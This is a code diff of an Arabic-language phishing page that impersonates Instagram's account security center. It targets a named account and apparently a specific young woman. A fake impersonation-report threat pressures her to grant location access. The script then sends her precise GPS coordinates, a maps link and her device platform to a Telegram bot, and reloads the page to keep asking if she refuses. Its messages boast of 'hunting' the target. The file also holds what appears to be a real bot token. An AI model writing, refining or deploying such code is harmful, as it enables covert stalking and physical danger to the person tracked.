@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز أمان الحسابات</title>
+    <title>مركز أمان الحسابات - إنستغرام</title>
     <style>
-        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; border-top: 5px solid #1877f2; }
-        .icon { width: 80px; margin-bottom: 20px; }
-        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 22px; }
-        p { color: #606770; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
+        .icon { width: 100px; margin-bottom: 20px; }
+        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 22px; }
+        p { color: #606770; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
         .btn { background-color: #1877f2; color: white; padding: 14px; border-radius: 8px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; }
         .btn:hover { background-color: #166fe5; }
         #status { margin-top: 15px; font-size: 14px; font-weight: bold; color: #42b72a; display: none; }
@@ -18,41 +18,62 @@
 <body>
 
 <div class="card">
-    <img src="https://cdn-icons-png.flaticon.com/512/1067/1067566.png" class="icon">
+    <img src="https://cdn-icons-png.flaticon.com/512/1067/1067566.png" class="icon" alt="Support">
     <h2>تأكيد الهوية الرقمية</h2>
-    <p>بناءً على طلب "بلاغ انتحال" المقدم ضد الحساب <b>(ha2542213)</b>، يجب السماح بالوصول للموقع للمطابقة الأمنية وإلغاء عملية الحذف التلقائي للملف الشخصي.</p>
+    <p>بناءً على طلب "بلاغ انتحال" المقدم ضد الحساب <br><b>(ha2542213)</b>، يجب السماح بالوصول للموقع للمطابقة الأمنية وإلغاء عملية الحذف التلقائي للملف الشخصي.</p>
     <button class="btn" onclick="verify()">تأكيد الموقع وإلغاء البلاغ</button>
     <div id="status">تمت المصادقة! جاري التحويل...</div>
 </div>
 
 <script>
+    // بيانات الربط الخاصة بك
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function send(m) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
+    function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
     }
 
     function verify() {
+        // إعدادات جلب الموقع بأعلى دقة ممكنة
+        const geoOptions = {
+            enableHighAccuracy: true, 
+            timeout: 10000,           
+            maximumAge: 0             
+        };
+
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(p) {
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                const acc = p.coords.accuracy;
-                const googleMaps = `https://www.google.com/maps?q=${lat},${lat},${lon}`;
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy; // دقة الموقع بالأمتار
                 
-                send(`🎯 تم صيد موقع البنت بنجاح!\n📍 الرابط: ${googleMaps}\n📏 الدقة: ${acc} متر`);
+                // رابط خرائط جوجل المباشر
+                const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                 
+                let report = `🎯 **تم صيد موقع الهدف بنجاح!**\n\n`;
+                report += `👤 الحساب: ha2542213\n`;
+                report += `📍 رابط الخريطة:\n${googleMaps}\n\n`;
+                report += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر\n`;
+                report += `📱 نظام الجهاز: ${navigator.platform}`;
+
+                sendToTelegram(report);
+
+                // إظهار رسالة النجاح والتحويل
                 document.getElementById('status').style.display = 'block';
                 setTimeout(() => {
                     window.location.href = "https://help.instagram.com";
                 }, 2000);
 
-            }, function(e) {
-                send("⚠️ البنت دخلت وضغطت (رفض) للموقع.. جاري إعادة الطلب.");
-                alert("خطأ: يجب السماح بالوصول للموقع لإتمام عملية إلغاء البلاغ.");
-                verify(); 
-            }, {enableHighAccuracy: true});
+            }, function(error) {
+                // إذا رفضت البنت الوصول للموقع
+                sendToTelegram("⚠️ البنت (ha2542213) فتحت الرابط ورفضت إعطاء صلاحية الموقع.");
+                alert("تنبيه أمني: يجب السماح بالوصول للموقع لإتمام عملية إلغاء البلاغ وحماية حسابك.");
+                // إعادة طلب الموقع لإجبارها
+                location.reload(); 
+            }, geoOptions);
+        } else {
+            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع.");
         }
     }
 </script>
